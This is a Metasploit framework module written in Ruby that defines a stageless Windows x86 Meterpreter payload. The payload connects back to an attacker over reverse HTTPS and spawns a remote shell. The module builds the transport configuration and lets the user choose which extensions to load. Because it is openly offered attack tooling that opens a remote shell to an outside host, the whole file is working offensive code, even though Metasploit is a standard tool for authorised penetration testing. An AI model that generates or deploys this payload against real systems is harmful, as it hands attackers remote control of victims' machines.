##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'msf/core/payload/transport_config'
require 'msf/core/handler/reverse_https'
require 'msf/core/payload/windows/meterpreter_loader'
require 'msf/base/sessions/meterpreter_x86_win'
require 'msf/base/sessions/meterpreter_options'
require 'rex/payloads/meterpreter/config'

module Metasploit4

  CachedSize = 959043

  include Msf::Payload::TransportConfig
  include Msf::Payload::Windows
  include Msf::Payload::Single
  include Msf::Payload::Windows::MeterpreterLoader
  include Msf::Sessions::MeterpreterOptions

  def initialize(info = {})

    super(merge_info(info,
      'Name'        => 'Windows Meterpreter Shell, Reverse HTTPS Inline',
      'Description' => 'Connect back to attacker and spawn a Meterpreter shell',
      'Author'      => [ 'OJ Reeves' ],
      'License'     => MSF_LICENSE,
      'Platform'    => 'win',
      'Arch'        => ARCH_X86,
      'Handler'     => Msf::Handler::ReverseHttps,
      'Session'     => Msf::Sessions::Meterpreter_x86_Win
      ))

    register_options([
      OptString.new('EXTENSIONS', [false, 'Comma-separate list of extensions to load']),
      OptString.new('EXTINIT',    [false, 'Initialization strings for extensions'])
    ], self.class)
  end

  def generate
    stage_meterpreter(true) + generate_config
  end

  def generate_config(opts={})
    opts[:uuid] ||= generate_payload_uuid
    opts[:stageless] = true

    # create the configuration block
    config_opts = {
      arch:       opts[:uuid].arch,
      exitfunk:   datastore['EXITFUNC'],
      expiration: datastore['SessionExpirationTimeout'].to_i,
      uuid:       opts[:uuid],
      transports: [transport_config_reverse_https(opts)],
      extensions: (datastore['EXTENSIONS'] || '').split(','),
      ext_init:   (datastore['EXTINIT'] || '')
    }

    # create the configuration instance based off the parameters
    config = Rex::Payloads::Meterpreter::Config.new(config_opts)

    # return the binary version of it
    config.to_b
  end
end
